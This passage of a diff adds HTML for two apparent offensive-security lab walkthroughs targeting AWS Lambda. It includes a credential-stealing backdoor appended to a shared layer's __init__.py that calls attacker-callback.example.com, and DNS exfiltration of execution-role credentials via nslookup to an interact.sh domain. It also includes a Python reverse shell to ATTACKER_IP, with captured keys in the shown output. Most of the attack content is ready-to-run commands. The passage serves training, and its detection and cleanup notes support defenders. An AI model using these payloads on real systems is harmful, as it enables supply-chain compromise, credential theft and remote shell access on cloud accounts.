+  --query 'Layers' \
+  --output json \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">[
+    {
+        "Arn": "arn:aws:lambda:us-east-1:123456789012:layer:shared-utils:3",
+        "CodeSize": 28472
+    }
+]</div>
+              <div class="terminal-cmd"># Layer name: shared-utils, version: 3
+# Layer ARN will be used in the next step to download its contents</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Download the existing layer package, extract it, and inspect the contents to understand where to inject malicious code.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ LAYER_URL=$(aws lambda get-layer-version \
+  --layer-name shared-utils \
+  --version-number 3 \
+  --query 'Content.Location' \
+  --output text \
+  --profile lab-lambda \
+  --region us-east-1)
+$ curl -s "$LAYER_URL" -o shared-utils-v3.zip
+$ unzip shared-utils-v3.zip -d ./layer-contents && ls -R ./layer-contents</div>
+              <div class="terminal-output">./layer-contents:
+python/
+
+./layer-contents/python:
+shared_utils/
+
+./layer-contents/python/shared_utils:
+__init__.py  db.py  auth.py  logger.py</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Inject malicious code into the layer's <code>__init__.py</code>. The injected code runs whenever any function imports from the layer. The payload exfiltrates credentials via an HTTP callback every time a function is invoked.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ cat >> ./layer-contents/python/shared_utils/__init__.py &lt;&lt; 'PAYLOAD'
+
+# BEGIN INJECTED
+import os, urllib.request
+_creds = {k: os.environ.get(k,'') for k in ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN']}
+try:
+    urllib.request.urlopen(
+        'https://attacker-callback.example.com/exfil?' +
+        '&'.join(f'{k}={v}' for k,v in _creds.items()), timeout=3)
+except Exception:
+    pass
+# END INJECTED
+PAYLOAD</div>
+              <div class="terminal-output"># Appended to __init__.py — exfiltrates IAM creds on every cold start</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Repackage the modified layer contents and publish a new layer version to the account.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ cd ./layer-contents && zip -r ../shared-utils-poisoned.zip . && cd ..
+$ aws lambda publish-layer-version \
+  --layer-name shared-utils \
+  --description "v3.1 patch" \
+  --zip-file fileb://shared-utils-poisoned.zip \
+  --compatible-runtimes python3.9 python3.11 \
+  --query '[LayerVersionArn,Version]' \
+  --output json \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">[
+    "arn:aws:lambda:us-east-1:123456789012:layer:shared-utils:4",
+    4
+]</div>
+              <div class="terminal-cmd"># New version 4 published — now update the function to use it</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Update the target function's layer reference to point to the malicious version. This takes effect on the next invocation &mdash; no redeployment of the function itself is needed.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda update-function-configuration \
+  --function-name order-processor \
+  --layers "arn:aws:lambda:us-east-1:123456789012:layer:shared-utils:4" \
+  --query '[FunctionName,Layers[0].Arn]' \
+  --output json \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">[
+    "order-processor",
+    "arn:aws:lambda:us-east-1:123456789012:layer:shared-utils:4"
+]</div>
+              <div class="terminal-cmd"># Verify the update applied:
+$ aws lambda get-function-configuration \
+  --function-name order-processor \
+  --query 'Layers' \
+  --output json \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">[
+    {
+        "Arn": "arn:aws:lambda:us-east-1:123456789012:layer:shared-utils:4",
+        "CodeSize": 29103
+    }
+]</div>
+              <div class="terminal-cmd"># Version updated from :3 to :4 — backdoor is now active
+# Any function importing from shared-utils will exfiltrate its creds on cold start</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /.lab-steps -->
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">get-function-configuration</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Download layer</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Inject payload</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">publish-layer-version</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">update-function-configuration</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection:</strong> <code>lambda:PublishLayerVersion</code> and <code>lambda:UpdateFunctionConfiguration</code> both produce CloudTrail events. An unexpected version bump on a shared layer, or an <code>UpdateFunctionConfiguration</code> not triggered by the CI/CD pipeline ARN, is a high-fidelity indicator of compromise. Defenders should use AWS Config rules or EventBridge rules to alert on <code>UpdateFunctionConfiguration</code> from non-approved IAM principals. MITRE: <a href="https://attack.mitre.org/techniques/T1525/" target="_blank">T1525</a>.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong>
+      <ul>
+        <li>Revert the function to the original layer version: <code>aws lambda update-function-configuration --function-name order-processor --layers "arn:aws:lambda:us-east-1:123456789012:layer:shared-utils:3" --profile lab-lambda --region us-east-1</code></li>
+        <li>Delete the poisoned layer version: <code>aws lambda delete-layer-version --layer-name shared-utils --version-number 4 --profile lab-lambda --region us-east-1</code></li>
+        <li>Delete local files: <code>rm -rf ./layer-contents shared-utils-v3.zip shared-utils-poisoned.zip</code></li>
+        <li>Verify the function is back on version 3: re-run <code>get-function-configuration --query 'Layers'</code></li>
+      </ul>
+    </div>
+
+  </div><!-- /#M09-L04-content -->
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 5: DNS Callback Exfiltration and Reverse Shell           -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M09-L05-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Establish out-of-band communication from inside a Lambda function using DNS-based data exfiltration. Understand the network constraints of Lambda functions in and out of VPCs and choose the correct channel accordingly. After this lab, students will be able to determine a Lambda function's network egress path, exfiltrate data via DNS subdomains when TCP is restricted, and set up a DNS callback listener using interact.sh or Burp Collaborator.
+      <br><br>
+      <strong>MITRE ATT&amp;CK:</strong> <a href="https://attack.mitre.org/techniques/T1048/001/" target="_blank">T1048.001 — Exfiltration Over Alternative Protocol: DNS</a> | <a href="https://attack.mitre.org/techniques/T1071/004/" target="_blank">T1071.004 — Application Layer Protocol: DNS</a>
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>Confirmed RCE on a target Lambda function (from L02 or via a separate injection path)</li>
+        <li>A DNS callback service configured: <a href="https://app.interactsh.com" target="_blank">interact.sh</a> (free, no install) or Burp Collaborator</li>
+        <li>Alternatively: a domain you control with wildcard DNS logging (e.g., via a VPS running <code>tcpdump -i eth0 udp port 53</code>)</li>
+        <li>Permissions: <code>lambda:InvokeFunction</code> and <code>lambda:GetFunctionConfiguration</code> to check VPC config</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Before attempting any outbound connection, check the Lambda function's VPC configuration. Functions not in a VPC have direct outbound internet access. Functions inside a VPC require a NAT Gateway for outbound TCP; DNS still resolves via the VPC resolver but external TCP connections will fail without a route.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda get-function-configuration \
+  --function-name vulnerable-calc \
+  --query 'VpcConfig' \
+  --output json \
+  --profile lab-lambda \
+  --region us-east-1</div>
+              <div class="terminal-output">{
+    "SubnetIds": [],
+    "SecurityGroupIds": [],
+    "VpcId": ""
+}</div>
+              <div class="terminal-cmd"># SCENARIO A: Empty VpcConfig (as above)
+# Function is NOT in a VPC = direct outbound internet
+# Both TCP reverse shells AND DNS callbacks will work
+
+# SCENARIO B: VpcConfig populated
+# {
+#     "SubnetIds": ["subnet-0abc123"],
+#     "SecurityGroupIds": ["sg-0def456"],
+#     "VpcId": "vpc-0ghi789"
+# }
+# Function IS in a VPC = check for NAT Gateway before attempting TCP
+# If no NAT Gateway: only DNS-based exfiltration will work</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Set up a DNS callback listener using interact.sh. This service gives you a unique subdomain and logs all DNS lookups that resolve to it &mdash; no server setup required.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Option 1: Use the interactsh-client CLI
+$ go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+$ interactsh-client</div>
+              <div class="terminal-output">[INF] Listing on unique interactsh URL: abc123xyz.oast.pro
+[INF] Logs will appear here as callbacks arrive</div>
+              <div class="terminal-cmd"># Option 2: Use the web UI at https://app.interactsh.com
+# Your unique callback domain: abc123xyz.oast.pro
+# All DNS queries to *.abc123xyz.oast.pro are captured and displayed</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Exfiltrate the Lambda execution role identity via DNS. The <code>id</code> command output is base64-encoded (no padding) and used as a subdomain label, which carries data through the DNS query without any TCP connection required.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ payload=$(python3 -c "import json; print(json.dumps({'expression': '__import__(\"os\").popen(\"nslookup $(id|base64 -w0).abc123xyz.oast.pro\").read()'}))")
+$ aws lambda invoke \
+  --function-name vulnerable-calc \
+  --payload "$payload" \
+  --cli-binary-format raw-in-base64-out \
+  --profile lab-lambda \
+  --region us-east-1 \
+  out.txt && cat out.txt</div>
+              <div class="terminal-output">{"statusCode": 200, "body": "{\"result\": \"Server:\\t\\t169.254.169.253\\nAddress:\\t169.254.169.253#53\\n\\nNon-authoritative answer:\\nName:\\tdWlkPTk5Myh...\"}"}</div>
+              <div class="terminal-cmd"># Check interact.sh listener output:</div>
+              <div class="terminal-output">[DNS] Received DNS interaction (A) from 54.173.xxx.xxx (AWS Lambda egress IP)
+[DNS] Query: dWlkPTk5Myh1c2VyMSkgZ2lkPTk5MA==.abc123xyz.oast.pro
+[*] Base64 decoded: uid=993(sbx_user1051) gid=990 groups=990</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Exfiltrate the AWS credential environment variables via multiple DNS queries. Each query carries a chunk of base64-encoded data. DNS labels are limited to 63 characters, so multi-variable payloads must be split across multiple lookups.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Exfiltrate AWS_ACCESS_KEY_ID via DNS subdomain:
+$ aws lambda invoke \
+  --function-name vulnerable-calc \
+  --payload '{"expression":"__import__(\"os\").popen(\"nslookup $( echo $AWS_ACCESS_KEY_ID | base64 -w0 ).abc123xyz.oast.pro\").read()"}' \
+  --cli-binary-format raw-in-base64-out \
+  --profile lab-lambda \
+  --region us-east-1 \
+  out.txt</div>
+              <div class="terminal-output">{"statusCode": 200, "body": "{\"result\": \"Server: ...\"}"}</div>
+              <div class="terminal-cmd"># interact.sh captures:
+# QVNJQUlPU0ZPRE5ON0VYQU1QTEU=.abc123xyz.oast.pro
+# Decoded: ASIAIOSFODNN7EXAMPLE
+
+# IMPORTANT: If Lambda is in a private VPC WITHOUT a NAT Gateway:
+# - nslookup WILL succeed (DNS resolution goes through the VPC resolver)
+# - But TCP-based reverse shells (nc, bash -i, etc.) WILL FAIL
+# - DNS-only exfiltration is your only reliable channel in that scenario</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">For functions with full outbound internet access (no VPC, or VPC with NAT), attempt a TCP reverse shell using a Python one-liner. Start the listener on your attacker host first.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># On attacker host — start netcat listener:
+$ nc -lvnp 4444</div>
+              <div class="terminal-output">Listening on 0.0.0.0 4444</div>
+              <div class="terminal-cmd"># Fire the Python reverse shell payload (replace ATTACKER_IP):
+$ aws lambda invoke \
+  --function-name vulnerable-calc \
+  --payload '{"expression":"__import__(\"os\").popen(\"python3 -c \\\"import socket,subprocess,os;s=socket.socket();s.connect((\\\\\\\"ATTACKER_IP\\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\\\\\"/bin/sh\\\\\\\"])\\\"&\").read()"}' \
+  --cli-binary-format raw-in-base64-out \
+  --profile lab-lambda \
+  --region us-east-1 \
+  out.txt</div>
+              <div class="terminal-output"># On attacker host (netcat listener):
+Connection received from 54.173.xxx.xxx
+$ id
+uid=993(sbx_user1051) gid=990 groups=990
+$ env | grep AWS
+AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+AWS_SESSION_TOKEN=AQoXnyc4lcK4a7QJe2e...</div>
+              <div class="terminal-cmd"># Note: Lambda execution timeout applies — default 30s for this function
+# Shell will be killed when the function times out. Work fast.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /.lab-steps -->
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">Check VpcConfig</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Set up interact.sh</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">DNS exfil payload</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Capture at listener</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Decode base64 data</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection:</strong> DNS-based exfiltration is notoriously difficult to detect. Lambda functions do not send DNS query logs to CloudTrail by default. Route 53 Resolver Query Logs must be explicitly enabled on the VPC (not available for non-VPC Lambda). For non-VPC functions, DNS queries leave no AWS-native log trail at all &mdash; detection requires network-layer controls outside AWS. TCP reverse shells, by contrast, are detectable via VPC Flow Logs (if in a VPC) or GuardDuty's network anomaly findings. MITRE: <a href="https://attack.mitre.org/techniques/T1048/001/" target="_blank">T1048.001</a>.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong>
+      <ul>
+        <li>Terminate the netcat listener: <code>Ctrl+C</code></li>
+        <li>Close the interact.sh session and discard the callback domain</li>
+        <li>Delete local output files: <code>rm -f out.txt</code></li>
+        <li>No persistent AWS resources were created in this lab</li>
+        <li>In a real engagement, document all callback domains used and include them in the report IOC section</li>
+      </ul>
+    </div>
+
+  </div><!-- /#M09-L05-content -->
+
+</div><!-- /#m09-labs -->
